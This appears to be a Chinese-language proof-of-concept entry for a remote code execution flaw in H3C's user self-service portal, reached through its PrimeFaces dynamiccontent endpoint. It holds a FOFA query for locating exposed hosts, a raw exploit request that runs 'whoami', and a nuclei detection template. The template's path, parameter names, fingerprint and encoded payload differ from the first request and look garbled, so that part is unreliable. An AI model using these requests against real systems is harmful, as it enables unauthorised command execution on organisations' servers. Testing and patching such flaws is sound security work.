## 描述：华三用户自助服务产品dynamiccontent.properties.xhtml接口处存在RCE漏洞

### 1. fofa语句
```fofa
fid="tPmVs5PL6e9m5Xt0J4V2+A=="
```

### 2、数据包
```http
POST /mselfservice/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1
Host: 127.0.0.1
User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)
Content-Length: 1573
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

pfdrt=sc
&ln=primefaces
&pfdrid=uMKljPgnOTVxmOB%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUDzOAoSQnmBt4dYyjvjGhVqupdmBV%2FKAe9gtw54DSQCl72JjEAsHTRvxAuJC%2B%2FIFzB8dhqyGafOLqDOqc4QwUqLOJ5KuwGRarsPnIcJJwQQ7fEGzDwgaD0Njf%2FcNrT5NsETV8ToCfDLgkzjKVoz1ghGlbYnrjgqWarDvBnuv%2BEo5hxA5sgRQcWsFs1aN0zI9h8ecWvxGVmreIAuWduuetMakDq7ccNwStDSn2W6c%2BGvDYH7pKUiyBaGv9gshhhVGunrKvtJmJf04rVOy%2BZLezLj6vK%2BpVFyKR7s8xN5Ol1tz%2FG0VTJWYtaIwJ8rcWJLtVeLnXMlEcKBqd4yAtVfQNLA5AYtNBHneYyGZKAGivVYteZzG1IiJBtuZjHlE3kaH2N2XDLcOJKfyM%2FcwqYIl9PUvfC2Xh63Wh4yCFKJZGA2W0bnzXs8jdjMQoiKZnZiqRyDqkr5PwWqW16%2FI7eog15OBl4Kco%2FVjHHu8Mzg5DOvNevzs7hejq6rdj4T4AEDVrPMQS0HaIH%2BN7wC8zMZWsCJkXkY8GDcnOjhiwhQEL0l68qrO%2BEb%2F60MLarNPqOIBhF3RWB25h3q3vyESuWGkcTjJLlYOxHVJh3VhCou7OICpx3NcTTdwaRLlw7sMIUbF%2FciVuZGssKeVT%2FgR3nyoGuEg3WdOdM5tLfIthl1ruwVeQ7FoUcFU6RhZd0TO88HRsYXfaaRyC5HiSzRNn2DpnyzBIaZ8GDmz8AtbXt57uuUPRgyhdbZjIJx%2FqFUj%2BDikXHLvbUMrMlNAqSFJpqoy%2FQywVdBmlVdx%2BvJelZEK%2BBwNF9J4p%2F1fQ8wJZL2LB9SnqxAKr5kdCs0H%2FvouGHAXJZ%2BJzx5gcCw5h6%2Fp3ZkZMnMhkPMGWYIhFyWSSQwm6zmSZh1vRKfGRYd36aiRKgf3AynLVfTvxqPzqFh8BJUZ5Mh3V9R6D%2FukinKlX99zSUlQaueU22fj2jCgzvbpYwBUpD6a6tEoModbqMSIr0r7kYpE3tWAaF0ww4INtv2zUoQCRKo5BqCZFyaXrLnj7oA6RGm7ziH6xlFrOxtRd%2BLylDFB3dcYIgZtZoaSMAV3pyNoOzHy%2B1UtHe1nL97jJUCjUEbIOUPn70hyab29iHYAf3%2B9h0aurkyJVR28jIQlF4nT0nZqpixP%2Fnc0zrGppyu8dFzMqSqhRJgIkRrETErXPQ9sl%2BzoSf6CNta5ssizanfqqCmbwcvJkAlnPCP5OJhVes7lKCMlGH%2BOwPjT2xMuT6zaTMu3UMXeTd7U8yImpSbwTLhqcbaygXt8hhGSn5Qr7UQymKkAZGNKHGBbHeBIrEdjnVphcw9L2BjmaE%2BlsjMhGqFH6XWP5GD8FeHFtuY8bz08F4Wjt5wAeUZQOI4rSTpzgssoS1vbjJGzFukA07ahU%3D
&cmd=whoami
```

### 3、nuclei POC
```yaml
id: H3C-RCE

info:
  name: 华三自助服务产品存在远程代码执行
  author: someone
  severity: high
  metadata:
    fofa-query: fid="tPmV5P5L6e9m5Xt0J4V2+A=="

variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"

http:
  - raw:
      - |
        POST /melfservice/javax.faces.resource/dynamiccontent.properties.xhtml HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)
        Content-Length: 1573
        Content-Type: application/x-www-form-urlencoded
        Accept-Encoding: gzip

        pfdr=sc&ln=primefaces&pfdr=uMK1jPgn0TVxm0B%2BH6%2FQEPW9ghJMGL3PRdkfmbiiPkUdzA0OsQNbn4tD4VYj6vjhgVqBdWDm%2FKAe9gtW5d4QSOCL7ZjJEASHtRVxaAuCJ2%2FB1FZbBdhqy6Af0lQbQ0gcQ4uQJysKuw6RarsPnIcJvWQQ7fEGZdwGaD0Njfj2FcNrT5NsETV8tOcfDLgkzJKVoz1gh6IbYNrjpgWarDvBunv%2BE0oShxA5sRqQcWsFs1aNOzI9h8ecWxVGmreIAuwDduetMakDq7fccNwStDsnW2o6%2BBvDYH7pKUiyBa6v9gshhhVGunnKvtJmJfO4rV0y%2BZLezLj6vK%2BpVyKR7s8xN501Itz2F%2F6O7tVJYWaIt8w8JrcWLtVexLmXlEcBq4dyAtVfQNLASYaYnHney0zKAGivYtezQ6I1iBtzujHle3Kahl2NXDLcOjKfqY7tFwCj0yV1JPUvFcxZ6h3h6vCFKjZGA2Ov8tnXs6jdjMqOiKnZq4YjqkqDp5rkWoW1G%2FI7oe9g150BL4kCo%2FVJhHUuBzgSD0vNevzs7hej6qrdj4tAAEDVRpMQSOaHH2nB7wC8zMZwsCJkX9yWDcOnjhiWH6LOL6kq%2B6hB6f2%2Bh6FMLarNPQ0ibH3rWB2Sdh3qky6yuSwGkCjTtJLLY0xHVJh3vChOu7OlpCx3NcTtdwaRLlw5MiUbf%2Fc1VuZ6ssKeVT%2FgR3nyo6uEg3Wd0dM5tLfITh1nruwQe7FoUFChR6UdZTfO8OHRYSxfaaeRyC5HiSrzRN2DpnyzB1aZ8GDmz8aXbtT5e7uuPRqyhdBzjItX%2FqFuJj%2BDikXHLvBUbMrMLNaqSFJpqqy%2FqYwvDBmVdx%2BvJeJZEK%2B8BwNF9J4pX2f1F8qwJZL2LB9SnqXAkRr5kD6ahSKH%2FvoqUHAXzZ%2BJzsxgCw5h6%2Fp3kZxMmhKPMGWYHfywSSQwm6zmS7hlvRKfR6YD3aiRkgf3AynLfVTvqxpzPfHbBJUZ5MhVW3H9w2Fukin1K9x99zSULaune2ZfjCgjzvbpYwUBpD6a6tEoMODm9sIrQMrYpK3eEtWaAWfOm4iVTzu2QoRcKbo5qCZFyaXLrJu7oA6RGM7jH6xLfroRtxuR%2BDLyJDFB3dcy1gZ1Z0aSM4V3pOy%2BIuthe1nI9vJUCjuEbI0uP0n7yhoab29iHYAF3%2B9h0aUrkyJWR2B1OLf4nT0njQipxR2Fnc0zrGpyu6dfzqSqhRgJikrEtErXPQ9s1B2BzoSf6CNtaSssizanqfqCmbwcvJkaLvpC5OjhVes7LKCMLGh%2BWP7JxMuT6zaThU3MEtX8uTd7uYImpSbwTLhqcbayqt8h6Sn5Q7r0uYmKKAZGNHK6HBeIReJdnhpcw9L2jma%2BLsjhJ6qHq5XWPSG8FeHfTuY8bz08F4Wjt5wAeUZQ014rSTpzgssOslvbjJ6zFuKA07aHU%3D&cmd=echo "THIS_VLUN_IS_OK"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "THIS_VLUN_IS_OK"
        condition: or
      - type: status
        status:
          - 200